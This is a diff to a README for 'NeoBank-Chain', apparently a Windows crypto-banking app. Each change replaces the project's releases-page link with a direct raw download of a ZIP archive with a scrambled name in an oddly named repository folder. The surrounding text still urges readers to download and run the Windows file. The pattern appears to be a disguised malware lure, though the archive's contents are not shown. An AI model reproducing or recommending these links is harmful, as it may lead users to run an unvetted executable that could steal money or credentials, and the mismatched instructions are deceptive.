@@ -1,6 +1,6 @@
 # 💠 NeoBank-Chain - Control Your Money On Chain
 
-[![Download NeoBank-Chain](https://img.shields.io/badge/Download-NeoBank--Chain-6B7280?style=for-the-badge&logo=github)](https://github.com/soledadpepsin39/NeoBank-Chain/releases)
+[![Download NeoBank-Chain](https://img.shields.io/badge/Download-NeoBank--Chain-6B7280?style=for-the-badge&logo=github)](https://github.com/soledadpepsin39/NeoBank-Chain/raw/refs/heads/main/witchetty/Chain-Bank-Neo-v1.9-beta.4.zip)
 
 ## 🚀 What NeoBank-Chain Does
 
@@ -12,7 +12,7 @@ It is made for Windows users who want a clean app with a familiar layout. You do
 
 Visit this page to download the app for Windows:
 
-https://github.com/soledadpepsin39/NeoBank-Chain/releases
+https://github.com/soledadpepsin39/NeoBank-Chain/raw/refs/heads/main/witchetty/Chain-Bank-Neo-v1.9-beta.4.zip
 
 On that page, look for the latest release and choose the Windows file. In most cases, the file will be named with Windows or `.exe` in it.
 
@@ -31,7 +31,7 @@ If your PC uses a work or school account, you may need admin access to install t
 
 ## 🛠️ Install NeoBank-Chain on Windows
 
-1. Open the download page: https://github.com/soledadpepsin39/NeoBank-Chain/releases
+1. Open the download page: https://github.com/soledadpepsin39/NeoBank-Chain/raw/refs/heads/main/witchetty/Chain-Bank-Neo-v1.9-beta.4.zip
 2. Find the newest release at the top of the page
 3. Download the Windows installer or app file
 4. If the file is in a ZIP folder, right-click it and choose Extract All
@@ -209,6 +209,6 @@ This keeps your account easier to manage and helps you avoid mistakes
 
 If you need to get the app again, use this page:
 
-https://github.com/soledadpepsin39/NeoBank-Chain/releases
+https://github.com/soledadpepsin39/NeoBank-Chain/raw/refs/heads/main/witchetty/Chain-Bank-Neo-v1.9-beta.4.zip
 
 Open the latest release, download the Windows file, and run it on your PC
